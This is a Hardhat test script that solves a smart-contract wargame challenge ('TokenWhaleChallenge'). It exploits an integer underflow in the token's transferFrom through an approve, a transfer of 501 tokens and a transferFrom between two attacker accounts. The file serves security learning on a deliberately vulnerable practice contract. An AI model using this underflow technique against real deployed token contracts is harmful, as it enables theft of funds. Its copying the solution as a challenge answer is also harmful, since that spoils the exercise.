import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('TokenWhaleChallenge', () => {
  let target: Contract;
  let attacker1: SignerWithAddress;
  let attacker2: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker1, attacker2, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenWhaleChallenge', deployer)
    ).deploy(attacker1.address);

    await target.deployed();

    target = target.connect(attacker1);

  });

  it('exploit', async () => {
    /**
     * YOUR CODE HERE
     * */

    // underflow attack

    // need two accounts (updated)

   // 1. Approve tokens from a Secondary Account, so that the Attacker can move its funds
   await target.connect(attacker2).approve(attacker1.address, 1000);

   // 2. Transfer 501 tokens from the Attacker to Attacker2
   await target.connect(attacker1).transfer(attacker2.address, 501);

   // 3. Let the Attacker call transferFrom to move 500 tokens from the Attacker2 Account to any address
   await target.connect(attacker1).transferFrom(attacker2.address, deployer.address, 500);

    expect(await target.isComplete()).to.equal(true);

  });
});
